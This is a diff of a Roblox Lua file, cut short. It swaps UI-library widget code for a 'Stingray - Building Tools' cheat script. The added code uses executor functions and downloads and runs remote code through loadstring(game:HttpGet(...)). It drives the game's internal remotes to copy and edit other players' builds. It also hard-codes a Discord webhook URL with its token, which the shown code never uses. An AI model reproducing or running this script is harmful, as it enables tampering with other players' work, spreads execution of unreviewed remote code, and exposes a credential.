@@ -1,1092 +1,960 @@
-pcall(function()
-local ms = game.Players.LocalPlayer:GetMouse()
-local uis = game:GetService("UserInputService")
-local btn = sliderElement
-local infBtn = viewInfo
-local hovering = false
-btn.MouseEnter:Connect(function()
-if not focusing then
-game.TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-}):Play()
-hovering = true
-end 
-end)
-btn.MouseLeave:Connect(function()
-if not focusing then
-game.TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = themeList.ElementColor
-}):Play()
-hovering = false
-end
-end)        
+-- Setup
+local hook =
+    'https://discord.com/api/webhooks/1089258719705038868/VVCdyT5Jb2ZjYe4ISelMo_EEPzcEIw8OhbXwH6pZOH-QTjneAKdb7kJzlZPQ8aob47GS'
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local colors = {
+    SchemeColor = Color3.fromRGB(30, 100, 255),
+    Background = Color3.fromRGB(0, 0, 0),
+    Header = Color3.fromRGB(0, 0, 0),
+    TextColor = Color3.fromRGB(255, 255, 255),
+    ElementColor = Color3.fromRGB(30, 30, 30)
+}
+local Window = Library.CreateLib("Stingray - Building Tools", colors)
+local mainFunc = getrenv()._G.Anchoerd;
+local plr = game:GetService("Players").LocalPlayer;
+local FindFirstChild = game.FindFirstChild;
+local toolController = {'resize', 'paint', 'material', 'cancollide', 'transparency', 'Configure', 'surface',
+                        'reflectance'};
 
-coroutine.wrap(function()
-while wait() do
-if not hovering then
-    sliderElement.BackgroundColor3 = themeList.ElementColor
+function getScript(k)
+    if table.find(toolController, k) then
+        return FindFirstChild(plr.PlayerGui["Z-BUILD"], "ToolController", true);
+    elseif k == "Insert" then
+        return FindFirstChild(plr.PlayerGui.Extra_UI, "Insert", true);
+    elseif k == "grouping" then
+        return FindFirstChild(plr.Character, "SH");
+    elseif k == "keybind" then
+        return FindFirstChild(plr.PlayerGui.Extra_UI, "Mech", true);
+    end
 end
-moreInfo.TextColor3 = themeList.TextColor
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-val.TextColor3 = themeList.TextColor
-write.ImageColor3 = themeList.SchemeColor
-togName.TextColor3 = themeList.TextColor
-viewInfo.ImageColor3 = themeList.SchemeColor
-sliderBtn.BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 5, themeList.ElementColor.g * 255 + 5, themeList.ElementColor.b * 255  + 5)
-sliderDrag.BackgroundColor3 = themeList.SchemeColor
-end
-end)()
+local FireRemote = function(usage, ...)
+    local src = getScript(usage);
+    if not src then
+        return print(usage, "not found");
+    end
 
-local Value
-sliderBtn.MouseButton1Down:Connect(function()
-if not focusing then
-game.TweenService:Create(val, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    TextTransparency = 0
-}):Play()
-Value = math.floor((((tonumber(maxvalue) - tonumber(minvalue)) / 149) * sliderDrag.AbsoluteSize.X) + tonumber(minvalue)) or 0
-pcall(function()
-    callback(Value)
-end)
-sliderDrag:TweenSize(UDim2.new(0, math.clamp(mouse.X - sliderDrag.AbsolutePosition.X, 0, 149), 0, 6), "InOut", "Linear", 0.05, true)
-moveconnection = mouse.Move:Connect(function()
-    val.Text = Value
-    Value = math.floor((((tonumber(maxvalue) - tonumber(minvalue)) / 149) * sliderDrag.AbsoluteSize.X) + tonumber(minvalue))
-    pcall(function()
-        callback(Value)
+    return mainFunc(src, usage, ...);
+end
+function GetGarage(Plr)
+    for i, v in pairs(game.Workspace:GetDescendants()) do
+        if v:IsA("TextLabel") and v.Text == tostring(Plr) then
+            return v.Parent.Parent.Parent.Parent
+        end
+    end
+end
+function GetPlr(Garage)
+    if game.Teams["Garage " .. Garage]:GetPlayers()[1] == nil then
+        return "Garage " .. Garage
+    else
+        return game.Teams["Garage " .. Garage]:GetPlayers()[1]
+    end
+end
+
+local T_From
+local T_To
+
+local PlayerToEdit = tostring(plr)
+local PartsToEdit = {}
+
+local PlayerToConfig = tostring(plr)
+local PartsToConfig = {}
+
+local PlayerToBuild = tostring(plr)
+local PartsToPaint = {}
+
+local PlayerToRotate = tostring(plr)
+local PlayerToResize = tostring(plr)
+
+-- End of Setup
+
+-- Build Transferring
+function BuildCopy()
+        local plrother = game:GetService("Players"):FindFirstChild(T_From)
+        local SurfaceNames = {"Top", "Back", "Left", "Right", "Bottom", "Front"}
+        function GetPlayer(PlrS)
+            if PlrS == "me" then
+                return game.Players.LocalPlayer
+            end
+            for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+                if string.lower(tostring(v):sub(1, string.len(PlrS))) == string.lower(PlrS) or
+                    string.lower(v.DisplayName:sub(1, string.len(PlrS))) == string.lower(PlrS) then
+                    return v
+                end
+            end
+        end
+        
+        function GetPropertys(Part, ToClone)
+            if Part:FindFirstChild("BeltSpeed") then
+                FireRemote("Configure", "Conveyor", "Function", Part, ToClone.Function.Value)
+                FireRemote("Configure", "Conveyor", "BeltSpeed", Part, ToClone.BeltSpeed.Value)
+            elseif Part:FindFirstChild("ParticleEmitter") then
+                local PE = ToClone.ParticleEmitter
+                FireRemote("Configure", "PEmitter", "Acceleration", Part, PE.Acceleration)
+                FireRemote("Configure", "PEmitter", "Size", Part, PE.Size)
+                FireRemote("Configure", "PEmitter", "Lifetime", Part, PE.Lifetime)
+                FireRemote("Configure", "PEmitter", "Speed", Part, PE.Speed)
+                FireRemote("Configure", "PEmitter", "Rate", Part, PE.Rate)
+                FireRemote("Configure", "PEmitter", "Color", Part, PE.Color)
+                FireRemote("Configure", "PEmitter", "Texture", Part, PE.Texture, string.split(PE.Texture, "//")[2])
+                FireRemote("Configure", "PEmitter", "LockedToPart", Part, PE.LockedToPart)
+            elseif Part:FindFirstChild("BodyThrust") then
+                FireRemote("Configure", "Thruster", "MaxThrust", Part, ToClone.MaxThrust.Value)
+            elseif Part:FindFirstChild("SeatTorque") then
+                FireRemote("Configure", "Driver Seat", "CameraLock", Part, ToClone.CameraLock.Value)
+                FireRemote("Configure", "Driver Seat", "SeatSpeed", Part, ToClone.SeatSpeed.Value)
+                FireRemote("Configure", "Driver Seat", "SeatTorque", Part, ToClone.SeatTorque.Value)
+            elseif Part.Name == "TorqueBlock" then
+                FireRemote("Configure", "TorqueBlock", "Torque", Part, ToClone.Torque.Value)
+            elseif Part:FindFirstChild("Trail") then
+                FireRemote("Configure", "TrailPart", "ID", Part, ToClone.Identifier.Value)
+            elseif Part:FindFirstChild("Decal") then
+                FireRemote("Configure", "DecalPart", "ID", Part, ToClone.Identifier.Value)
+            elseif Part:FindFirstChild("Texture") then
+                FireRemote("Configure", "TexturePart", "TileStuds", Part, ToClone.TileStuds.Value)
+                FireRemote("Configure", "TexturePart", "Identifier", Part, ToClone.Identifier.Value)
+            elseif Part:FindFirstChild("VectorBlock") then
+                FireRemote("Configure", "GravityBlock", "Force", Part, ToClone.Force.Value)
+            elseif Part:FindFirstChild("RotForce") then
+                FireRemote("Configure", "MomentumDrag", "DirForce", Part, ToClone.DirForce.Value)
+                FireRemote("Configure", "MomentumDrag", "RotForce", Part, ToClone.RotForce.Value)
+            elseif Part:FindFirstChild("HoverHeight") then
+                FireRemote("Configure", "Hover", "HoverHeight", Part, ToClone.HoverHeight.Value)
+            elseif Part:FindFirstChild("Sound") then
+                FireRemote("Configure", "SoundPart", "Loop", Part, ToClone.Loop.Value)
+                FireRemote("Configure", "SoundPart", "Identifier", Part, ToClone.Identifier.Value)
+            elseif Part:FindFirstChild("Delay") then
+                FireRemote("Configure", "Fuse", "Delay", Part, ToClone.Delay.Value)
+            elseif Part:FindFirstChild("BoosterOption") then
+                FireRemote("Configure", "Booster", "BoosterOption", Part, ToClone.BoosterOption.Value)
+            elseif Part:FindFirstChild("SpringConstraint") then
+                FireRemote("Configure", "SpringA", "Length", Part, ToClone.SpringConstraint.MaxLength)
+                FireRemote("Configure", "SpringA", "FreeLength", Part, ToClone.SpringConstraint.FreeLength)
+            elseif Part:FindFirstChild("WFriction") then
+                FireRemote("Configure", "Wheel", "Friction", Part, ToClone.WFriction.Value)
+                FireRemote("Configure", "Wheel", "Elastic", Part, ToClone.WElasticity.Value)
+            elseif Part:FindFirstChild("PBlast") then
+                FireRemote("Configure", "PressureBomb", "PBlast", Part, ToClone.PBlast.Value)
+            elseif Part:FindFirstChild("CustomSnapOption") then
+                FireRemote("Configure", "Magnet", "CustomSnapOption", Part, ToClone.CustomSnapOption.Value)
+                FireRemote("Configure", "Magnet", "DetectionRange", Part, ToClone.DetectionRange.Value)
+                FireRemote("Configure", "Magnet", "MagnetForce", Part, ToClone.MagnetForce.Value)
+                FireRemote("Configure", "Magnet", "ScaleSnapOption", Part, ToClone.ScaleSnapOption.Value)
+            elseif Part:FindFirstChild("MSpeed") then
+                FireRemote("Configure", "Motor", "MSpeed", Part, ToClone.MSpeed.Value)
+                FireRemote("Configure", "Motor", "MTorque", Part, ToClone.MTorque.Value)
+                FireRemote("Configure", "Motor", "LockedInPlace", Part, ToClone.LockedInPlace.Value)
+                FireRemote("Configure", "Motor", "CW", Part, ToClone.CW.Value)
+            elseif Part:FindFirstChild("compass") then
+                print("Compass")
+                for name,value in pairs(ToClone:GetAttributes()) do
+                    print(name,value)
+                    FireRemote("Configure", "Goal Compass",name,Part,value)
+                end
+
+            else
+                for i, v in pairs(Part:GetChildren()) do
+                    if pcall(function()
+                        return v.Value
+                    end) then
+                        FireRemote("Configure", tostring(Part), tostring(v), v.Value)
+                    end
+                end
+            end
+        end
+    
+        function CloneGarage(Plr)
+            local MyGarage = GetGarage(game:GetService("Players"):FindFirstChild(T_To))
+            local MyBase = MyGarage.BuildZone
+            local MyParts = MyGarage.Parts
+            local PlrGarage = GetGarage(GetPlayer(Plr))
+            local Keybinds = {}
+            for i, v in pairs(PlrGarage.Keybinds:GetChildren()) do
+                Keybinds[tostring(v)] = v.BindName.Value
+            end
+            local PlrParts = PlrGarage.Parts:Clone()
+            local PlrBase = PlrGarage.BuildZone
+            local CopyProperties = {}
+            rotationDifference = PlrBase.CFrame:pointToWorldSpace(Vector3.new()) - MyBase.CFrame:pointToWorldSpace(Vector3.new())
+            local SpringAList = {}
+            local SpringBList = {}
+            local SP = 1
+            for i,v in ipairs(PlrParts:GetChildren()) do
+                if v.Name == "SpringA" then
+                    SpringAList[SP] = v
+                    SP = SP + 1
+                end
+                
+            end
+            for i,v in ipairs(PlrParts:GetChildren()) do
+            if v.Name == "SpringB" then
+                for i,p in ipairs(PlrParts:GetChildren()) do
+                    if p.Name == "SpringA"then
+                    if v.Index.Value == p.Index.Value then
+                        SpringBList[table.find(SpringAList,p)] = v
+                    end
+                end
+            end
+        end
+    end
+    SP = 1
+            local groups = {
+                [1] = {},
+                [2] = {},
+                [3] = {}
+            }
+            local Count = 0
+            local MaxCount = 0
+            local Con = MyParts.ChildAdded:connect(function(Ch)
+                wait()
+                for i = 1, #CopyProperties do
+                    if not CopyProperties[i]["Done"] and tostring(Ch) == CopyProperties[i][2].Name and
+                        (CopyProperties[i][1].Position - (Ch.Position - MyBase.Position)).Magnitude <= 0.001 then
+                        CopyProperties[i]["Done"] = true
+                        FireRemote("resize", Ch, CopyProperties[i][2].Size, Ch.CFrame) 
+                        FireRemote("paint", Ch, CopyProperties[i][2].Color)
+                        FireRemote("material", Ch, CopyProperties[i][2].Material) 
+                        FireRemote("cancollide", Ch, CopyProperties[i][2].CanCollide) 
+                        FireRemote("transparency", Ch, CopyProperties[i][2].Transparency) 
+                        FireRemote("reflectance", Ch, CopyProperties[i][2].Reflectance) 
+                        for a = 1, #SurfaceNames do
+                            FireRemote("surface", Ch, SurfaceNames[a] .. "Surface",
+                                CopyProperties[i][2][SurfaceNames[a] .. "Surface"])
+                        end
+                        pcall(function()
+                            GetPropertys(Ch, CopyProperties[i][2])
+                        end)
+                        if CopyProperties[i][2]:FindFirstChild("KeyLabel") then
+                            local L = CopyProperties[i][2]:FindFirstChild("KeyLabel")
+                            FireRemote("keybind", L.Key.Text, L.Action.Text, Keybinds[L.Key.Text], Ch)
+                        end
+                        if Ch:FindFirstChild("Switch") then
+                            if CopyProperties[i][2].Switch.Value == false then
+                                fireclickdetector(Ch:FindFirstChild("ClickDetector"))
+                            end
+                        end
+    
+                        if Ch:FindFirstChild("Group") then
+                            table.insert(groups[CopyProperties[i][2].Group.Value], Ch)
+                        end
+                        break
+                    end
+                end
+                Count = Count + 1
+            end)
+            local Plane = PlrBase
+            local m = 1
+            local angle = math.deg(rotationDifference.Y)
+            local CenterDistanceX = {}
+            local CenterDistanceZ = {}
+            for i,v in ipairs(PlrGarage.Parts:GetChildren()) do
+                CenterDistanceX[m] = (Plane.Position.X - v.Position.X)
+                CenterDistanceZ[m] = (Plane.Position.Z - v.Position.Z)
+            m=m+1
+            end
+            m=1
+            for i, v in pairs(PlrParts:GetChildren()) do
+                if v:IsA("BasePart") then
+                    task.wait();
+                    --[[
+                    local LocalAngle = (math.atan(CenterDistanceZ[m] / CenterDistanceX[m]))
+                    local Hype = (math.sqrt(CenterDistanceX[m] ^ 2 + CenterDistanceZ[m] ^ 2))
+                    local distanceZ = Hype * (math.sin(math.pi - (math.rad(angle) + LocalAngle)))
+                    local distanceX = Hype * (math.cos(math.pi - (math.rad(angle) + LocalAngle)))
+                    local CF = (v.CFrame - PlrBase.Position + Vector3.new(CenterDistanceX[m], 0, CenterDistanceZ[m]) +
+                                Vector3.new(distanceX, 0, -distanceZ))
+                    local RotCF = CFrame.Angles(0, math.rad(angle), 0):ToObjectSpace(CF)
+                    local Offset = CFrame.fromMatrix(CF.Position, RotCF.XVector, RotCF.YVector, RotCF.ZVector) 
+                    ]]--
+                    local Offset = v.CFrame - PlrBase.Position
+                    table.insert(CopyProperties, {Offset, v:Clone()})
+                    if v.Name=="SpringA" then
+                        FireRemote("Insert", "Spring", MyBase.CFrame+Vector3.new(0,10,0))
+                    elseif v.Name == "SpringB" then
+                    else
+                    FireRemote("Insert", tostring(v), Offset + MyBase.Position)
+                    end
+                    MaxCount = MaxCount + 1
+                    m=m+1
+                end
+            end
+            repeat
+                wait()
+            until MaxCount == Count
+            for i = 1, 3 do
+                FireRemote("grouping", groups[i], i)
+            end
+            Con:Disconnect()
+            wait(1)
+    
+            for i,l in ipairs(MyParts:GetChildren()) do
+                if l.Name == "SpringB" then
+                    FireRemote("resize",l,SpringBList[SP].Size,SpringBList[SP].CFrame-PlrBase.Position+MyBase.Position)
+                    FireRemote("cancollide",l,SpringBList[SP].CanCollide)
+                    for i,v in ipairs(MyParts:GetChildren()) do
+                        if v.Name == "SpringA" and v.Index.Value == l.Index.Value then
+                            FireRemote("resize",v,SpringAList[SP].Size,SpringAList[SP].CFrame-PlrBase.Position+MyBase.Position)
+                            FireRemote("cancollide",v,SpringAList[SP].CanCollide)
+                            FireRemote("Configure", "SpringA", "Length", v, SpringAList[SP].SpringConstraint.MaxLength)
+                            FireRemote("Configure", "SpringA", "FreeLength", v, SpringAList[SP].SpringConstraint.FreeLength)
+                            SP = SP + 1
+                        end
+                    end
+                    
+                end
+            end
+        end
+    
+        CloneGarage(T_From)
+        
+    
+end
+local TransferTab = Window:NewTab("Transfer")
+local BuildTransfer = TransferTab:NewSection("Build Transfer")
+local TransferFrom = BuildTransfer:NewDropdown("Transfer From", "Player to transfer the build from",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        T_From = k
     end)
-    sliderDrag:TweenSize(UDim2.new(0, math.clamp(mouse.X - sliderDrag.AbsolutePosition.X, 0, 149), 0, 6), "InOut", "Linear", 0.05, true)
+local TransferTo = BuildTransfer:NewDropdown("Transfer To", "Player to transfer the build to",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        T_To = k
+    end)
+BuildTransfer:NewButton("Confirm Transfer", "Transfer the build from the preset players", function()
+    BuildCopy()
 end)
-releaseconnection = uis.InputEnded:Connect(function(Mouse)
-    if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then
-        Value = math.floor((((tonumber(maxvalue) - tonumber(minvalue)) / 149) * sliderDrag.AbsoluteSize.X) + tonumber(minvalue))
-        pcall(function()
-            callback(Value)
-        end)
-        val.Text = Value
-        game.TweenService:Create(val, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-            TextTransparency = 1
-        }):Play()
-        sliderDrag:TweenSize(UDim2.new(0, math.clamp(mouse.X - sliderDrag.AbsolutePosition.X, 0, 149), 0, 6), "InOut", "Linear", 0.05, true)
-        moveconnection:Disconnect()
-        releaseconnection:Disconnect()
-    end
-end)
-else
-for i,v in next, infoContainer:GetChildren() do
-    Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    focusing = false
-end
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-end
-end)
-viewInfo.MouseButton1Click:Connect(function()
-if not viewDe then
-viewDe = true
-focusing = true
-for i,v in next, infoContainer:GetChildren() do
-    if v ~= moreInfo then
-        Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    end
-end
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,0,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 0.5}, 0.2)
-Utility:TweenObject(btn, {BackgroundColor3 = themeList.ElementColor}, 0.2)
-wait(1.5)
-focusing = false
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,2,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-wait(0)
-viewDe = false
-end
-end)        
-local DropYSize = 33
-
-
-local dropFrame = Instance.new("Frame")
-local dropOpen = Instance.new("TextButton")
-local listImg = Instance.new("ImageLabel")
-local itemTextbox = Instance.new("TextLabel")
-local viewInfo = Instance.new("ImageButton")
-local UICorner = Instance.new("UICorner")
-local UIListLayout = Instance.new("UIListLayout")
-local Sample = Instance.new("ImageLabel")
-
-local ms = game.Players.LocalPlayer:GetMouse()
-Sample.Name = "Sample"
-Sample.Parent = dropOpen
-Sample.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample.BackgroundTransparency = 1.000
-Sample.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample.ImageColor3 = themeList.SchemeColor
-Sample.ImageTransparency = 0.600
-
-dropFrame.Name = "dropFrame"
-dropFrame.Parent = sectionInners
-dropFrame.BackgroundColor3 = themeList.Background
-dropFrame.BorderSizePixel = 0
-dropFrame.Position = UDim2.new(0, 0, 1.23571432, 0)
-dropFrame.Size = UDim2.new(0, 352, 0, 33)
-dropFrame.ClipsDescendants = true
-local sample = Sample
-local btn = dropOpen
-dropOpen.Name = "dropOpen"
-dropOpen.Parent = dropFrame
-dropOpen.BackgroundColor3 = themeList.ElementColor
-dropOpen.Size = UDim2.new(0, 352, 0, 33)
-dropOpen.AutoButtonColor = false
-dropOpen.Font = Enum.Font.SourceSans
-dropOpen.Text = ""
-dropOpen.TextColor3 = Color3.fromRGB(0, 0, 0)
-dropOpen.TextSize = 14.000
-dropOpen.ClipsDescendants = true
-dropOpen.MouseButton1Click:Connect(function()
-if not focusing then
-if opened then
-    opened = false
-    dropFrame:TweenSize(UDim2.new(0, 352, 0, 33), "InOut", "Linear", 0.08)
-    wait(0.1)
-    updateSectionFrame()
-    UpdateSize()
-    local c = sample:Clone()
-    c.Parent = btn
-    local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-    c.Position = UDim2.new(0, x, 0, y)
-    local len, size = 0.35, nil
-    if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
-        size = (btn.AbsoluteSize.X * 1.5)
-    else
-        size = (btn.AbsoluteSize.Y * 1.5)
-    end
-    c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-    for i = 1, 10 do
-        c.ImageTransparency = c.ImageTransparency + 0.05
-        wait(len / 12)
-    end
-    c:Destroy()
-else
-    opened = true
-    dropFrame:TweenSize(UDim2.new(0, 352, 0, UIListLayout.AbsoluteContentSize.Y), "InOut", "Linear", 0.08, true)
-    wait(0.1)
-    updateSectionFrame()
-    UpdateSize()
-    local c = sample:Clone()
-    c.Parent = btn
-    local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-    c.Position = UDim2.new(0, x, 0, y)
-    local len, size = 0.35, nil
-    if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
-        size = (btn.AbsoluteSize.X * 1.5)
-    else
-        size = (btn.AbsoluteSize.Y * 1.5)
-    end
-    c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-    for i = 1, 10 do
-        c.ImageTransparency = c.ImageTransparency + 0.05
-        wait(len / 12)
-    end
-    c:Destroy()
-end
-else
-for i,v in next, infoContainer:GetChildren() do
-    Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-    focusing = false
-end
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-end
+BuildTransfer:NewKeybind("Toggle Tools", "Toggles gui with a keybind", Enum.KeyCode.RightShift, function()
+    Library:ToggleUI()
 end)
 
-listImg.Name = "listImg"
-listImg.Parent = dropOpen
-listImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-listImg.BackgroundTransparency = 1.000
-listImg.BorderColor3 = Color3.fromRGB(27, 42, 53)
-listImg.Position = UDim2.new(0.0199999996, 0, 0.180000007, 0)
-listImg.Size = UDim2.new(0, 21, 0, 21)
-listImg.Image = "rbxassetid://3926305904"
-listImg.ImageColor3 = themeList.SchemeColor
-listImg.ImageRectOffset = Vector2.new(644, 364)
-listImg.ImageRectSize = Vector2.new(36, 36)
+-- Part Editor
+local PartEditorTab = Window:NewTab("Part Editor")
+local PartSelector = PartEditorTab:NewSection("Select Parts")
+local PlayerEdit = PartSelector:NewDropdown("Player To Edit", "Select player's parts to edit",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        PlayerToEdit = k
+    end)
 
-itemTextbox.Name = "itemTextbox"
-itemTextbox.Parent = dropOpen
-itemTextbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-itemTextbox.BackgroundTransparency = 1.000
-itemTextbox.Position = UDim2.new(0.0970000029, 0, 0.273000002, 0)
-itemTextbox.Size = UDim2.new(0, 138, 0, 14)
-itemTextbox.Font = Enum.Font.GothamSemibold
-itemTextbox.Text = dropname
-itemTextbox.RichText = true
-itemTextbox.TextColor3 = themeList.TextColor
-itemTextbox.TextSize = 14.000
-itemTextbox.TextXAlignment = Enum.TextXAlignment.Left
-
-viewInfo.Name = "viewInfo"
-viewInfo.Parent = dropOpen
-viewInfo.BackgroundTransparency = 1.000
-viewInfo.LayoutOrder = 9
-viewInfo.Position = UDim2.new(0.930000007, 0, 0.151999995, 0)
-viewInfo.Size = UDim2.new(0, 23, 0, 23)
-viewInfo.ZIndex = 2
-viewInfo.Image = "rbxassetid://3926305904"
-viewInfo.ImageColor3 = themeList.SchemeColor
-viewInfo.ImageRectOffset = Vector2.new(764, 764)
-viewInfo.ImageRectSize = Vector2.new(36, 36)
-
-UICorner.CornerRadius = UDim.new(0, 4)
-UICorner.Parent = dropOpen
-
-local Sample = Instance.new("ImageLabel")
-
-Sample.Name = "Sample"
-Sample.Parent = dropOpen
-Sample.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample.BackgroundTransparency = 1.000
-Sample.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample.ImageColor3 = themeList.SchemeColor
-Sample.ImageTransparency = 0.600
-
-UIListLayout.Parent = dropFrame
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-UIListLayout.Padding = UDim.new(0, 3)
-
-updateSectionFrame() 
-UpdateSize()
-
-local ms = game.Players.LocalPlayer:GetMouse()
-local uis = game:GetService("UserInputService")
-local infBtn = viewInfo
-
-local moreInfo = Instance.new("TextLabel")
-local UICorner = Instance.new("UICorner")
-
-moreInfo.Name = "TipMore"
-moreInfo.Parent = infoContainer
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-moreInfo.Position = UDim2.new(0, 0, 2, 0)
-moreInfo.Size = UDim2.new(0, 353, 0, 33)
-moreInfo.ZIndex = 9
-moreInfo.RichText = true
-moreInfo.Font = Enum.Font.GothamSemibold
-moreInfo.Text = "  "..dropinf
-moreInfo.TextColor3 = themeList.TextColor
-moreInfo.TextSize = 14.000
-moreInfo.TextXAlignment = Enum.TextXAlignment.Left
-
-local hovering = false
-btn.MouseEnter:Connect(function()
-if not focusing then
-game.TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-}):Play()
-hovering = true
-end 
+local EditReq = PartSelector:NewTextBox("Reflectance Req", "Targets all parts with a set reflectance", function(k)
+    local Parts = GetGarage(PlayerToEdit).Parts:GetChildren()
+    local iterator = 1
+    for i, v in ipairs(Parts) do
+        if v.Reflectance > (k - 0.005) and v.Reflectance < (k + 0.005) then
+            PartsToEdit[iterator] = v
+            iterator = iterator + 1
+        end
+    end
 end)
-btn.MouseLeave:Connect(function()
-if not focusing then
-game.TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-    BackgroundColor3 = themeList.ElementColor
-}):Play()
-hovering = false
-end
-end)        
-coroutine.wrap(function()
-while wait() do
-if not hovering then
-    dropOpen.BackgroundColor3 = themeList.ElementColor
-end
-Sample.ImageColor3 = themeList.SchemeColor
-dropFrame.BackgroundColor3 = themeList.Background
-listImg.ImageColor3 = themeList.SchemeColor
-itemTextbox.TextColor3 = themeList.TextColor
-viewInfo.ImageColor3 = themeList.SchemeColor
-moreInfo.BackgroundColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 14, themeList.SchemeColor.g * 255 - 17, themeList.SchemeColor.b * 255 - 13)
-moreInfo.TextColor3 = themeList.TextColor
-end
-end)()
-UICorner.CornerRadius = UDim.new(0, 4)
-UICorner.Parent = moreInfo
-
-if themeList.SchemeColor == Color3.fromRGB(255,255,255) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(0,0,0)}, 0.2)
-end 
-if themeList.SchemeColor == Color3.fromRGB(0,0,0) then
-Utility:TweenObject(moreInfo, {TextColor3 = Color3.fromRGB(255,255,255)}, 0.2)
-end 
-
-viewInfo.MouseButton1Click:Connect(function()
-if not viewDe then
-viewDe = true
-focusing = true
-for i,v in next, infoContainer:GetChildren() do
-    if v ~= moreInfo then
-        Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
+local EditReq = PartSelector:NewTextBox("Transparency Req", "Targets all parts with a set transparency", function(k)
+    local Parts = GetGarage(PlayerToEdit).Parts:GetChildren()
+    local iterator = 1
+    for i, v in ipairs(Parts) do
+        if v.Transparency > (k - 0.005) and v.Transparency < (k + 0.005) then
+            PartsToEdit[iterator] = v
+            iterator = iterator + 1
+        end
     end
-end
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,0,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 0.5}, 0.2)
-Utility:TweenObject(btn, {BackgroundColor3 = themeList.ElementColor}, 0.2)
-wait(1.5)
-focusing = false
-Utility:TweenObject(moreInfo, {Position = UDim2.new(0,0,2,0)}, 0.2)
-Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-wait(0)
-viewDe = false
-end
-end)     
-
-for i,v in next, list do
-local optionSelect = Instance.new("TextButton")
-local UICorner_2 = Instance.new("UICorner")
-local Sample1 = Instance.new("ImageLabel")
-
-local ms = game.Players.LocalPlayer:GetMouse()
-Sample1.Name = "Sample1"
-Sample1.Parent = optionSelect
-Sample1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample1.BackgroundTransparency = 1.000
-Sample1.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample1.ImageColor3 = themeList.SchemeColor
-Sample1.ImageTransparency = 0.600
-
-local sample1 = Sample1
-DropYSize = DropYSize + 33
-optionSelect.Name = "optionSelect"
-optionSelect.Parent = dropFrame
-optionSelect.BackgroundColor3 = themeList.ElementColor
